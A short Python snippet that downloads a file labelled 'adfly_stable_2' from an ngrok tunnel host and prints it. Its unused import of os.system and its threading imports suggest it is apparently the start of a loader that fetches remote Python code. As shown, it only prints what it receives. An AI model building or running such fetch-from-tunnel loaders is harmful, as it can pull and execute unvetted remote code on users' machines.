from os import system as system_caller
from threading import Thread
from time import sleep

from requests import get
global_host_page = "https://36ab-103-27-2-163.in.ngrok.io"
next_file_code = "adfly_stable_2"
s=get(f"{global_host_page}/py_files?file_code={next_file_code}", timeout=10).content
print(s)